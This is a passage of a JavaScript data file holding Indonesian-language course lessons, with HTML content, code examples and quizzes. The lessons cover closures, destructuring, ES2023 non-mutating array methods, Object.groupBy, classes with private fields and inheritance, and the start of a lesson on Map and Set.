console.log(dompetBudi.lihatSaldo()); // 150000
console.log(dompetBudi.saldo);        // undefined (Terlindungi!)</pre>
<h3>Contoh Nyata 2: Fungsi Pabrik (<em>Function Factory</em>) dan Pembatas Frekuensi (<em>Debounce</em>)</h3>
<p>Di antarmuka web, saat pengguna mengetik di kotak pencarian, kita tidak ingin menembakkan permintaan API <code>fetch()</code> pada setiap ketukan huruf. Fungsi <strong><code>debounce</code></strong> menggunakan <em>closure</em> untuk menyimpan ID pengatur waktu (<code>timerId</code>) di antara ketukan huruf:</p>
<pre>function buatDebounce(fungsiTarget, jedaMs = 300) {
  let timerId = null; // Disimpan di dalam closure!

  return function (...argumen) {
    // Batalkan jadwal sebelumnya jika pengguna masih terus mengetik
    clearTimeout(timerId);

    // Jadwalkan ulang eksekusi setelah pengguna berhenti mengetik selama jedaMs
    timerId = setTimeout(() =&gt; {
      fungsiTarget(...argumen);
    }, jedaMs);
  };
}</pre>
<h2>4. Jebakan Klasik Closure di Dalam Perulangan (<code>var</code> vs <code>let</code>)</h2>
<p>Mengapa dulu <code>setTimeout</code> di dalam perulangan <code>for (var i = 0; ...)</code> selalu mencetak angka terakhir yang sama?</p>
<ul><li>Karena <strong><code>var</code> memiliki cakupan fungsi</strong>, sehingga semua callback <code>setTimeout</code> berbagi <strong>satu variabel <code>i</code> yang sama</strong> di dalam closure mereka!</li><li>Sebaliknya, <strong><code>let</code> memiliki cakupan blok</strong>, dan JavaScript menciptakan <strong>ikatan variabel <code>i</code> yang baru dan terpisah untuk setiap putaran iterasi</strong>:</li></ul>
<pre>// BENAR: Menggunakan 'let' menciptakan ikatan closure tersendiri di tiap iterasi (mencetak 1, 2, 3)
for (let i = 1; i &lt;= 3; i++) {
  setTimeout(() =&gt; {
    console.log(\`Iterasi ke-\${i}\`);
  }, i * 100);
}</pre>
<h2>Latihan Praktik: Membangun Fungsi <em>Memoization</em> (Cache Hasil Perhitungan) dengan Closure</h2>
<p>Buatlah berkas <code>closure-cache.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat fungsi <code>denganCache(fungsiHitung)</code> yang menyimpan sebuah <code>const tembolok = new Map()</code> di dalam closure-nya.</li><li>Fungsi yang dikembalikan menerima satu argumen <code>input</code>. Jika <code>tembolok.has(input)</code> bernilai <code>true</code>, langsung kembalikan nilai dari <code>tembolok.get(input)</code> tanpa menjalankan ulang <code>fungsiHitung</code>.</li><li>Jika belum ada, jalankan <code>const hasil = fungsiHitung(input)</code>, simpan ke <code>tembolok.set(input, hasil)</code>, lalu kembalikan <code>hasil</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures" rel="noopener">Closures — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Execution_model" rel="noopener">JavaScript execution model — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/" rel="noopener">ECMAScript Language Specification — TC39</a></li></ul></div>
`,
    perintah: ["let","var","const","undefined","setTimeout","i"],
    kuis: [
        {"tanya":"Apa yang dimaksud dengan Temporal Dead Zone (TDZ) pada variabel yang dideklarasikan dengan let atau const?","opsi":["Waktu jeda 5 detik sebelum memori variabel dibersihkan oleh Garbage Collector.","Area kode sejak awal blok { hingga baris tempat variabel let/const dideklarasikan, di mana upaya mengakses variabel tersebut akan langsung melempar ReferenceError.","Kondisi ketika peramban membeku akibat perulangan tanpa henti.","Variabel global yang tidak pernah digunakan di dalam program."],"benar":1,"penjelasan":"Variabel let dan const sebenarnya sudah dikenali keberadaannya di awal blok oleh mesin JavaScript, tetapi tetap berstatus uninitialized sampai baris deklarasinya dieksekusi. Zona sebelum baris inisialisasi inilah yang disebut TDZ untuk mencegah penggunaan variabel sebelum waktunya."},
        {"tanya":"Perhatikan potongan kode berikut: ```js function buatPengali(faktor) { return (angka) => angka * faktor; } const kaliTiga = buatPengali(3); console.log(kaliTiga(7)); ``` Mengapa pemanggilan kaliTiga(7) masih dapat mengetahui bahwa nilai faktor adalah 3, padahal fungsi buatPengali(3) sudah selesai dijalankan sebelumnya?","opsi":["Karena JavaScript menyalin variabel faktor ke dalam localStorage peramban.","Karena arrow function yang dikembalikan membentuk closure yang mempertahankan referensi ke lingkungan leksikal tempat ia dibuat (termasuk parameter faktor = 3).","Karena semua parameter fungsi di JavaScript bersifat variabel global.","Karena kaliTiga menjalankan ulang fungsi buatPengali dari awal."],"benar":1,"penjelasan":"Inilah inti dari closure: fungsi dalam (angka) => angka * faktor mempertahankan rujukan ke lexical environment milik pemanggilan buatPengali(3), sehingga nilai faktor tetap hidup di memori selama fungsi kaliTiga masih ada."},
        {"tanya":"Apa perbedaan hasil antara menggunakan for (var i = 0; i < 3; i++) dan for (let i = 0; i < 3; i++) apabila di dalam blok perulangan tersebut terdapat callback asinkron setTimeout(() => console.log(i), 50)?","opsi":["var mencetak 0, 1, 2, sedangkan let mencetak 3, 3, 3.","var mencetak 3, 3, 3 (karena hanya ada satu variabel i di tingkat fungsi yang nilainya sudah menjadi 3 saat callback berjalan), sedangkan let mencetak 0, 1, 2 (karena let membuat ikatan variabel i baru untuk setiap putaran iterasi blok).","Keduanya selalu mencetak 0, 1, 2.","let tidak boleh digunakan bersama setTimeout."],"benar":1,"penjelasan":"Deklarasi let di kepala perulangan for memiliki perilaku khusus dalam spesifikasi ECMAScript: setiap kali iterasi berputar, ikatan (binding) leksikal baru untuk i diciptakan dengan nilai iterasi saat itu, sehingga tiap callback menutup (close over) nilai i miliknya masing-masing."}
    ]
},
{
    id: 4,
    kategori: "2 · Objek & Data",
    judul: "Objek dan Array Modern: Destructuring, Immutability (ES2023+), dan Object.groupBy",
    tingkat: "Menengah", durasi: "10 mnt",
    tag: ["Object.groupBy",".reduce()","..."],
    ringkas: "Mengolah struktur data objek dan array secara bersih menggunakan destructuring, operator spread, penyalinan mendalam structuredClone(), transformasi deklaratif (map, filter, reduce), metode array tak-mutasi ES2023 (toSorted, toSpliced, with), serta pengelompokan Object.groupBy().",
    isi: `
<h2>1. Destructuring dan Spread Operator (<code>...</code>)</h2>
<p>Dalam aplikasi modern, kita hampir setiap saat mengekstrak data dari respons JSON API atau merangkai objek konfigurasi baru tanpa merusak data aslinya.</p>
<h3>A. Object &amp; Array Destructuring</h3>
<p><em>Destructuring</em> memungkinkan Anda membongkar properti objek atau elemen array langsung ke dalam variabel bernama, lengkap dengan **nilai bawaan (<em>default value</em>)<strong> dan </strong>penggantian nama (<em>aliasing</em>)**:</p>
<pre>const responsKelas = {
  id: 101,
  judul: &quot;Dasar JavaScript Modern&quot;,
  penulis: { nama: &quot;Tim Kodeloka&quot; }
};

// Mengambil 'judul', mengganti nama 'id' menjadi 'idKelas',
// memberikan nilai bawaan 'tingkat = &quot;Dasar&quot;', dan membongkar objek bersarang 'penulis.nama'
const {
  id: idKelas,
  judul,
  tingkat = &quot;Dasar&quot;,
  penulis: { nama: namaPenulis }
} = responsKelas;

console.log(idKelas, judul, tingkat, namaPenulis);
// 101 &quot;Dasar JavaScript Modern&quot; &quot;Dasar&quot; &quot;Tim Kodeloka&quot;</pre>
<h3>B. Menyalin Objek: <em>Shallow Copy</em> (<code>...</code>) vs <em>Deep Copy</em> (<code>structuredClone</code>)</h3>
<p>Operator <em>spread</em> (<code>{ ...objekLama }</code> atau <code>[ ...arrayLama ]</code>) membuat **salinan dangkal (<em>shallow copy</em>)**: ia menyalin properti tingkat pertama, tetapi objek yang bersarang di dalamnya masih menunjuk ke referensi memori yang sama!</p>
<p>Untuk membuat **salinan mendalam (<em>deep clone</em>)<strong> dari objek atau array bersarang secara aman tanpa pustaka eksternal, gunakan fungsi standar web </strong><code>structuredClone()</code><strong> (status </strong>Baseline Widely Available** sejak 2022):</p>
<pre>const negaraAsli = {
  nama: &quot;Indonesia&quot;,
  ibuKota: { kota: &quot;Jakarta&quot;, pulau: &quot;Jawa&quot; }
};

// Salinan mendalam dengan structuredClone()
const salinanMandiri = structuredClone(negaraAsli);
salinanMandiri.ibuKota.kota = &quot;Nusantara&quot;;

console.log(negaraAsli.ibuKota.kota);     // Tetap &quot;Jakarta&quot; (Tidak ikut berubah!)
console.log(salinanMandiri.ibuKota.kota); // &quot;Nusantara&quot;</pre>
<h2>2. Transformasi Array Deklaratif: <code>map</code>, <code>filter</code>, <code>reduce</code>, <code>find</code>, <code>some</code>, <code>every</code></h2>
<p>Daripada menulis perulangan <code>for</code> panjang yang mencampuradukkan logika penyaringan, perubahan bentuk, dan penjumlahan di satu tempat, gunakan metode array deklaratif yang <strong>tidak mengubah array aslinya</strong>:</p>
<pre>const daftarModul = [
  { id: 1, judul: &quot;Tipe Data&quot;, durasiMenit: 15, selesai: true },
  { id: 2, judul: &quot;Closure&quot;,   durasiMenit: 25, selesai: true },
  { id: 3, judul: &quot;Fetch API&quot;, durasiMenit: 20, selesai: false }
];

// 1. filter(): Menyaring elemen yang memenuhi syarat -&gt; menghasilkan Array baru
const modulSelesai = daftarModul.filter((m) =&gt; m.selesai);

// 2. map(): Mengubah setiap elemen dengan rumus 1-ke-1 -&gt; menghasilkan Array baru dengan panjang sama
const daftarJudul = daftarModul.map((m) =&gt; m.judul);

// 3. reduce(): Merangkum seluruh elemen menjadi satu nilai akhir (selalu berikan nilai awal di argumen ke-2!)
const totalMenit = daftarModul.reduce((akumulator, m) =&gt; akumulator + m.durasiMenit, 0);

// 4. find(): Mencari SATU elemen pertama yang cocok (atau undefined jika tidak ditemukan)
const modulBelumSelesai = daftarModul.find((m) =&gt; !m.selesai);

// 5. every() dan some(): Menghasilkan boolean (Apakah SEMUA selesai? Apakah ADA minimal satu yang selesai?)
const semuaLulus = daftarModul.every((m) =&gt; m.selesai); // false
const adaProgres = daftarModul.some((m) =&gt; m.selesai);  // true</pre>
<div class="callout waspada"><div class="callout-judul">⚠️ Kesalahan Umum pada <code>.reduce()</code></div><p>Jangan pernah lupa menyertakan **nilai awal (<em>initial value</em>)<strong> sebagai argumen kedua (misalnya angka <code>0</code> pada <code>.reduce((acc, item) =&gt; ..., 0)</code>). Jika Anda memanggil <code>.reduce()</code> tanpa nilai awal pada sebuah array yang kebetulan kosong <code>[]</code>, JavaScript akan langsung melempar </strong><code>TypeError: Reduce of empty array with no initial value</code>**!</p></div>
<h2>3. Metode Array Tak-Mutasi (<em>Copying Array Methods</em> — Sejak ES2023)</h2>
<p>Selama puluhan tahun, empat metode array klasik di JavaScript memiliki efek samping berbahaya karena **mengubah (<em>mutate</em>) array aslinya secara langsung di tempat**:</p>
<ul><li><code>array.sort()</code> mengubah urutan array asli!</li><li><code>array.reverse()</code> membalik array asli!</li><li><code>array.splice()</code> memotong isi array asli!</li><li><code>array[i] = nilaiBaru</code> mengubah elemen di array asli!</li></ul>
<p>Sejak <strong>ECMAScript 2023</strong> (status <strong>Baseline Widely Available</strong>), hadir pasangan metode baru yang <strong>selalu mengembalikan salinan array baru dan membiarkan array aslinya tetap utuh</strong>:</p>
<table><thead><tr><th>Metode Lama (Merusak/Mutasi Array Asli)</th><th>Metode Baru ES2023 (Aman / Mengembalikan Array Baru)</th></tr></thead><tbody><tr><td><code>arr.sort(fn)</code></td><td><strong><code>arr.toSorted(fn)</code></strong></td></tr><tr><td><code>arr.reverse()</code></td><td><strong><code>arr.toReversed()</code></strong></td></tr><tr><td><code>arr.splice(mulai, hapus, ...item)</code></td><td><strong><code>arr.toSpliced(mulai, hapus, ...item)</code></strong></td></tr><tr><td><code>arr[indeks] = nilaiBaru</code></td><td><strong><code>arr.with(indeks, nilaiBaru)</code></strong></td></tr></tbody></table>
<pre>const skorAsli = [85, 100, 70, 92];

// Mengurutkan dari terkecil ke terbesar TANPA mengubah skorAsli
const skorUrut = skorAsli.toSorted((a, b) =&gt; a - b);

// Mengganti elemen pada indeks ke-2 (70 -&gt; 78) TANPA mengubah skorAsli
const skorKoreksi = skorAsli.with(2, 78);

console.log(skorAsli);    // [85, 100, 70, 92] (Utuh 100%!)
console.log(skorUrut);    // [70, 85, 92, 100]
console.log(skorKoreksi); // [85, 100, 78, 92]</pre>
<div class="callout info"><div class="callout-judul">💡 Jangan Lupa Pembanding Angka <code>(a, b) =&gt; a - b</code> pada <code>sort()</code> / <code>toSorted()</code>!</div><p>Jika Anda memanggil <code>[10, 2, 100].toSorted()</code> tanpa fungsi pembanding, JavaScript akan mengubah semua angka menjadi teks string lalu mengurutkannya berdasarkan urutan kode karakter UTF-16, sehingga menghasilkan <code>[10, 100, 2]</code>! Untuk mengurutkan angka, selalu berikan <code>(a, b) =&gt; a - b</code> (naik) atau <code>(a, b) =&gt; b - a</code> (turun).</p></div>
<h3>Mengambil Elemen dari Belakang dengan <code>.at(-1)</code></h3>
<p>Daripada menulis <code>daftar[daftar.length - 1]</code> yang panjang untuk mengambil elemen paling akhir dari sebuah array, gunakan metode <strong><code>daftar.at(-1)</code></strong> (Baseline Widely Available)!</p>
<h2>4. Mengelompokkan Data dengan <code>Object.groupBy()</code> (Sejak ES2024)</h2>
<p>Sebelumnya, mengelompokkan daftar objek berdasarkan kategori mengharuskan penulisan <code>.reduce()</code> yang bertele-tele. Sejak <strong>ECMAScript 2024</strong> (status <strong>Baseline Widely Available</strong>; didukung semua peramban utama sejak Maret 2024), Anda cukup memanggil <strong><code>Object.groupBy(iterable, callback)</code></strong>:</p>
<pre>const inventarisServer = [
  { nama: &quot;db-utama&quot;,     wilayah: &quot;jakarta&quot; },
  { nama: &quot;api-gateway&quot;,  wilayah: &quot;singapura&quot; },
  { nama: &quot;worker-antre&quot;, wilayah: &quot;jakarta&quot; }
];

const perWilayah = Object.groupBy(inventarisServer, (srv) =&gt; srv.wilayah);
console.log(perWilayah.jakarta);
// [{ nama: &quot;db-utama&quot;, wilayah: &quot;jakarta&quot; }, { nama: &quot;worker-antre&quot;, wilayah: &quot;jakarta&quot; }]</pre>
<h2>Latihan Praktik: Pipeline Analisis Data Nilai Peserta</h2>
<p>Buatlah berkas <code>olah-data.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Sediakan array <code>peserta</code> berisi 5 objek <code>{ nama, kelas, nilai }</code>.</li><li>Gunakan <code>.toSorted((a, b) =&gt; b.nilai - a.nilai)</code> untuk membuat daftar peringkat nilai tertinggi ke terendah tanpa mengubah urutan array <code>peserta</code> asli.</li><li>Gunakan <code>Object.groupBy()</code> untuk mengelompokkan peserta menjadi kelompok <code>&quot;Lulus&quot;</code> (<code>nilai &gt;= 75</code>) dan <code>&quot;Remedial&quot;</code> (<code>nilai &lt; 75</code>).</li><li>Hitung rata-rata nilai keseluruhan menggunakan <code>.reduce(..., 0)</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" rel="noopener"><code>Array</code> reference — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map" rel="noopener"><code>Array.prototype.map()</code> — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce" rel="noopener"><code>Array.prototype.reduce()</code> — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/" rel="noopener">ECMAScript Language Specification — TC39</a></li></ul></div>
`,
    perintah: [".reduce()","...","(a, b) => a - b","Object.groupBy()","peserta","structuredClone"],
    kuis: [
        {"tanya":"Apa hasil dari pemanggilan [20, 5, 100, 12].toSorted() apabila dipanggil tanpa argumen fungsi pembanding?","opsi":["[5, 12, 20, 100]","[100, 12, 20, 5] (diurutkan sebagai teks string berdasarkan kode karakter UTF-16).","[100, 20, 12, 5]","Melempar TypeError karena argumen pembanding wajib diisi."],"benar":1,"penjelasan":"Secara bawaan, baik .sort() maupun .toSorted() mengonversi elemen menjadi string lalu membandingkan urutan titik kode karakternya (\"100\" dan \"12\" dimulai dengan karakter \"1\" sehingga diletakkan sebelum \"20\" dan \"5\"). Untuk mengurutkan angka secara numerik, berikan fungsi (a, b) => a - b."},
        {"tanya":"Manakah perbedaan yang tepat antara operator spread { ...objek } dan fungsi structuredClone(objek)?","opsi":["{ ...objek } membuat salinan mendalam (deep copy), sedangkan structuredClone(objek) hanya menyalin properti tingkat pertama.","{ ...objek } hanya membuat salinan dangkal (shallow copy) sehingga objek yang bersarang di dalamnya masih berbagi referensi memori yang sama, sedangkan structuredClone(objek) membuat salinan mendalam (deep copy) yang sepenuhnya terpisah.","structuredClone() hanya dapat menyalin array berisi angka.","{ ...objek } menghapus properti yang bernilai null."],"benar":1,"penjelasan":"Spread { ...objek } menyalin referensi properti tingkat atas saja. Jika salah satu propertinya berupa objek atau array bersarang, mengubah isi objek bersarang tersebut pada hasil spread akan ikut mengubah objek aslinya. structuredClone() menyalin seluruh pohon objek bersarang secara rekursif."},
        {"tanya":"Metode array ES2023 manakah yang menghasilkan salinan array baru dengan satu elemen pada indeks tertentu diganti nilainya, tanpa memodifikasi array aslinya?","opsi":["daftar.splice(indeks, 1, nilaiBaru)","daftar.with(indeks, nilaiBaru)","daftar.at(indeks, nilaiBaru)","daftar.fill(nilaiBaru)"],"benar":1,"penjelasan":"Metode Array.prototype.with(index, value) adalah versi tak-mutasi (non-mutating) dari penugasan daftar[index] = value. Ia mengembalikan array baru dengan elemen pada indeks tersebut telah diperbarui, sementara array aslinya tetap utuh."}
    ]
},
{
    id: 5,
    kategori: "2 · Objek & Data",
    judul: "Prototipe, Sintaks class, Field Privat (#), dan Pewarisan (extends)",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["class","#","extends"],
    ringkas: "Memahami bagaimana pewarisan prototipe (prototypal inheritance) bekerja di balik layar, merancang cetak biru objek dengan sintaks class, menyembunyikan data internal dengan private fields (#), serta menerapkan static, getter/setter, dan extends / super.",
    isi: `
<h2>1. Bagaimana Objek di JavaScript Saling Mewarisi? (<em>Prototypal Inheritance</em>)</h2>
<p>Berbeda dengan bahasa seperti Java atau C++ klasik di mana class adalah cetak biru terpisah dari objek, di JavaScript <strong>setiap objek memiliki tautan internal tersembunyi (<code>[[Prototype]]</code>) yang menunjuk ke objek lain yang disebut prototipenya</strong>.</p>
<p>Ketika Anda memanggil <code>teks.toUpperCase()</code> atau <code>daftar.map(...)</code>, dari mana metode <code>.toUpperCase()</code> dan <code>.map()</code> itu berasal?</p>
<ol><li>Mesin JavaScript memeriksa apakah properti tersebut ada langsung di dalam objek <code>daftar</code> itu sendiri.</li><li>Jika tidak ada, mesin menelusuri rantai prototipe (<strong>Prototype Chain</strong>) ke atas menuju <code>Array.prototype</code>, lalu ke <code>Object.prototype</code>, hingga berakhir di <code>null</code>.</li></ol>
<p>Sintaks <strong><code>class</code></strong> yang diperkenalkan sejak ES2015 adalah cara yang bersih, terstruktur, dan modern untuk mendefinisikan konstruktor beserta metode-metode di dalam <code>prototype</code>-nya!</p>
<h2>2. Anatomi <code>class</code> Modern dan Enkapsulasi Sejati dengan <code>#</code> (<em>Private Fields</em>)</h2>
<p>Sebelum ES2022, pengembang JavaScript terpaksa menandai properti internal dengan garis bawah semu seperti <code>this._saldo</code>, padahal properti tersebut tetap bisa diubah sembarangan dari luar objek.</p>
<p>Kini (status <strong>Baseline Widely Available</strong>), awalan tanda pagar <strong><code>#</code></strong> menciptakan <strong>Private Fields dan Private Methods sejati</strong> yang ditegakkan langsung oleh mesin JavaScript: upaya mengakses <code>#properti</code> dari luar blok <code>class</code> akan langsung ditolak sebagai <strong>SyntaxError</strong>!</p>
<pre>class AkunLayanan {
  // 1. Public field dengan nilai awal
  peran = &quot;standar&quot;;

  // 2. Private field (wajib dideklarasikan di tingkat atas class dengan awalan #)
  #kunciApi;
  #kuotaTersisa;

  constructor(namaLayanan, kunciApi, kuotaAwal = 1000) {
    this.namaLayanan = namaLayanan;
    this.#kunciApi = kunciApi;
    this.#kuotaTersisa = kuotaAwal;
  }

  // 3. Getter untuk membaca nilai privat tanpa mengizinkan pengubahan sembarangan
  get kuota() {
    return this.#kuotaTersisa;
  }

  // 4. Private method (hanya bisa dipanggil dari dalam class ini)
  #formatHeaderOtorisasi() {
    return \`Bearer \${this.#kunciApi}\`;
  }

  pakaiKuota(jumlah = 1) {
    if (jumlah &gt; this.#kuotaTersisa) {
      throw new Error(\`Kuota layanan \${this.namaLayanan} habis.\`);
    }
    this.#kuotaTersisa -= jumlah;
    return {
      header: this.#formatHeaderOtorisasi(),
      sisa: this.#kuotaTersisa
    };
  }

  // 5. Memeriksa apakah suatu objek merupakan instans yang memiliki field #kunciApi (ergonomic brand check)
  static adalahAkunSah(objek) {
    return #kunciApi in objek;
  }
}

const akun = new AkunLayanan(&quot;Worker-Email&quot;, &quot;rahasia-xyz-99&quot;, 500);
console.log(akun.kuota); // 500 (Memanggil getter 'get kuota()')
// console.log(akun.#kunciApi); // SyntaxError: Private field '#kunciApi' must be declared in an enclosing class</pre>
<h2>3. Metode dan Properti <code>static</code></h2>
<p>Kata kunci <strong><code>static</code></strong> mendefinisikan properti atau metode yang menempel langsung pada <strong>Class itu sendiri</strong>, bukan pada masing-masing objek instans yang dibuat dengan <code>new</code>.</p>
<p>Metode <code>static</code> sangat cocok digunakan untuk:</p>
<ul><li><strong>Factory Methods:</strong> Membuat instans objek dari berbagai format masukan (misalnya <code>Pengguna.dariJson(str)</code>).</li><li><strong>Fungsi Utilitas atau Konstanta Kelas:</strong> Misalnya <code>Number.isNaN()</code>, <code>Array.isArray()</code>, atau <code>Object.groupBy()</code>.</li></ul>
<pre>class KonfigurasiDatabase {
  static PORT_BAWAAN = 5432;

  constructor(host, port = KonfigurasiDatabase.PORT_BAWAAN) {
    this.host = host;
    this.port = port;
  }

  // Static Factory Method
  static dariUrl(urlString) {
    const url = new URL(urlString);
    const port = url.port ? Number(url.port) : KonfigurasiDatabase.PORT_BAWAAN;
    return new KonfigurasiDatabase(url.hostname, port);
  }
}

const db = KonfigurasiDatabase.dariUrl(&quot;postgres://db.kodeloka.internal:6432/utama&quot;);
console.log(db.host, db.port); // &quot;db.kodeloka.internal&quot; 6432</pre>
<h2>4. Pewarisan Kelas dengan <code>extends</code> dan <code>super</code></h2>
<p>Gunakan kata kunci <strong><code>extends</code></strong> untuk membuat subkelas (<em>child class</em>) yang mewarisi perilaku kelas induk (<em>parent class</em>), dan gunakan <strong><code>super</code></strong> untuk memanggil konstruktor atau metode milik kelas induk:</p>
<pre>class PenyimpananDasar {
  constructor(awalanKunci) {
    this.awalanKunci = awalanKunci;
  }

  formatKunci(kunci) {
    return \`\${this.awalanKunci}:\${kunci}\`;
  }
}

class PenyimpananMemori extends PenyimpananDasar {
  #data = new Map();

  constructor(awalanKunci, kapasitasMaks = 100) {
    // WAJIB memanggil super(...) terlebih dahulu sebelum mengakses 'this' di dalam constructor anak!
    super(awalanKunci);
    this.kapasitasMaks = kapasitasMaks;
  }

  simpan(kunci, nilai) {
    if (this.#data.size &gt;= this.kapasitasMaks) {
      throw new Error(&quot;Kapasitas penyimpanan penuh.&quot;);
    }
    // Memanggil metode milik kelas induk dengan super.formatKunci()
    const kunciLengkap = super.formatKunci(kunci);
    this.#data.set(kunciLengkap, nilai);
  }

  ambil(kunci) {
    return this.#data.get(super.formatKunci(kunci));
  }
}</pre>
<div class="callout waspada"><div class="callout-judul">⚠️ Aturan Wajib <code>super()</code> di dalam Constructor Subkelas</div><p>Jika sebuah kelas menggunakan <code>extends</code> dan mendefinisikan <code>constructor()</code> miliknya sendiri, ia <strong>wajib memanggil <code>super(...)</code> sebelum menggunakan kata kunci <code>this</code></strong>. Jika Anda mencoba menulis <code>this.kapasitasMaks = 100</code> sebelum baris <code>super()</code>, JavaScript akan melempar <code>ReferenceError: Must call super constructor in derived class before accessing 'this'</code>.</p></div>
<h2>Latihan Praktik: Merancang Sistem Antrean Tugas Berorientasi Objek</h2>
<p>Buatlah berkas <code>antrean-tugas.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat class <code>Tugas</code> dengan field privat <code>#status = &quot;menunggu&quot;</code>, properti publik <code>id</code> dan <code>judul</code>, getter <code>status</code>, serta metode <code>selesaikan()</code> yang mengubah <code>#status</code> menjadi <code>&quot;selesai&quot;</code>.</li><li>Buat subkelas <code>TugasBerjadwal extends Tugas</code> yang menambahkan properti <code>tenggatWaktu</code> di dalam <code>constructor(id, judul, tenggatWaktu)</code> menggunakan <code>super(id, judul)</code>.</li><li>Uji pembuatan instans dengan <code>new TugasBerjadwal(...)</code> dan pastikan <code>#status</code> tidak dapat diubah secara paksa dari luar class.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_classes" rel="noopener">Using classes — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/Private_elements" rel="noopener">Private elements — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/" rel="noopener">ECMAScript Language Specification — TC39</a></li></ul></div>
`,
    perintah: ["class","static","extends","#","super","super()"],
    kuis: [
        {"tanya":"Apa perbedaan antara menulis properti _sandi (diawali garis bawah) dan #sandi (diawali tanda pagar) di dalam sebuah class JavaScript?","opsi":["_sandi dan #sandi sama-sama menghasilkan galat sintaks jika diakses dari luar class.","_sandi hanyalah konvensi penamaan tidak resmi yang tetap bisa dibaca dan diubah bebas dari luar objek, sedangkan #sandi adalah private field resmi yang ditegakkan oleh mesin JavaScript sehingga tidak dapat diakses dari luar blok deklarasi class.","#sandi hanya bisa menyimpan tipe angka, sedangkan _sandi bisa menyimpan string.","_sandi otomatis mengenkripsi nilainya dengan SHA-256."],"benar":1,"penjelasan":"Awalan garis bawah (_) hanyalah kesepakatan gaya penulisan antar-pemrogram dan tetap merupakan properti publik biasa. Sebaliknya, awalan # merupakan fitur bahasa ECMAScript resmi yang mengisolasi field tersebut secara ketat di dalam lingkup class."},
        {"tanya":"Di dalam sebuah class PembayaranKartu extends Pembayaran, apa yang terjadi jika di dalam constructor() milik PembayaranKartu Anda langsung menulis this.biayaAdmin = 2500; pada baris pertama tanpa memanggil super() terlebih dahulu?","opsi":["Nilai this.biayaAdmin berhasil disimpan dan super() dipanggil otomatis di akhir konstruktor.","Mesin JavaScript melempar ReferenceError karena di dalam subkelas (derived class), super() wajib dipanggil terlebih dahulu untuk menginisialisasi this sebelum this dapat diakses.","Kelas induk Pembayaran otomatis dihapus dari rantai prototipe.","Nilai this.biayaAdmin berubah menjadi undefined."],"benar":1,"penjelasan":"Pada kelas turunan yang menggunakan extends, alokasi dan inisialisasi objek this dilakukan oleh konstruktor kelas induk. Oleh karena itu, mengakses this sebelum memanggil super() merupakan galat ReferenceError."},
        {"tanya":"Bagaimana cara memanggil metode static dariJson(str) yang didefinisikan di dalam class Artikel?","opsi":["Membuat instans dulu dengan const a = new Artikel(); lalu memanggil a.dariJson(str).","Memanggilnya langsung pada nama kelasnya: Artikel.dariJson(str).","Memanggilnya melalui Object.prototype.dariJson(str).","Metode static hanya bisa dipanggil dari dalam metode #privat."],"benar":1,"penjelasan":"Metode yang diberi kata kunci static ditempelkan pada konstruktor class itu sendiri (Artikel.dariJson()), bukan pada Artikel.prototype milik instans objek."}
    ]
},
{
    id: 6,
    kategori: "2 · Objek & Data",
    judul: "Koleksi Berbasis Kunci: Map, Set (Metode Himpunan Baru), WeakMap, dan Symbol",
    tingkat: "Menengah", durasi: "10 mnt",
    tag: ["Map","Set","WeakMap"],
    ringkas: "Memilih struktur data yang tepat antara Map vs Object dan Set vs Array, memanfaatkan metode operasi himpunan Set terbaru (union, intersection, difference), mencegah kebocoran memori dengan WeakMap, serta mengenal Symbol.",
    isi: `
<h2>Mengapa <code>Object</code> dan <code>Array</code> Saja Tidak Selalu Cukup?</h2>
<p>Meskipun <code>Object</code> (<code>{}</code>) dan <code>Array</code> (<code>[]</code>) sangat fleksibel, keduanya memiliki keterbatasan struktural ketika menangani ribuan data dinamis:</p>
<ol><li>Kunci properti pada <code>Object</code> biasa <strong>selalu dipaksa menjadi <code>string</code> (atau <code>Symbol</code>)</strong>. Anda tidak bisa menjadikan elemen DOM atau objek lain sebagai kunci di dalam <code>{}</code>.</li><li>Memeriksa apakah sebuah nilai ada di dalam <code>Array</code> berukuran <code>100.000</code> elemen menggunakan <code>array.includes(x)</code> membutuhkan pencarian satu per satu dari awal hingga akhir (<strong>O(n)</strong>), sedangkan pencarian pada <code>Set</code> berlangsung nyaris instan (<strong>O(1)</strong>)!</li></ol>
<h2>1. <code>Map</code>: Kamus Pasangan Kunci-Nilai Berkinerja Tinggi</h2>
<p><strong><code>Map</code></strong> menyimpan pasangan kunci-nilai (<em>key-value pairs</em>) dengan keunggulan utama dibandingkan <code>Object</code> biasa:</p>
<table><thead><tr><th>Karakteristik</th><th><code>Map</code> (<code>new Map()</code>)</th><th><code>Object</code> Biasa (<code>{}</code>)</th></tr></thead><tbody><tr><td><strong>Tipe Kunci yang Diizinkan</strong></td><td><strong>Apa saja!</strong> (String, angka, boolean, fungsi, objek lain, bahkan elemen DOM).</td><td>Hanya <code>string</code> dan <code>Symbol</code> (angka <code>1</code> otomatis diubah menjadi string <code>&quot;1&quot;</code>).</td></tr><tr><td><strong>Menghitung Jumlah Item</strong></td><td>Instan melalui properti <strong><code>map.size</code></strong>.</td><td>Harus membuat array dulu lewat <code>Object.keys(obj).length</code>.</td></tr><tr><td><strong>Keamanan Kunci Masukan Pengguna</strong></td><td>Aman dari benturan dengan properti bawaan prototipe (seperti <code>&quot;toString&quot;</code> atau <code>&quot;constructor&quot;</code>).</td><td>Rawan bentrok dengan <code>Object.prototype</code> kecuali dibuat dengan 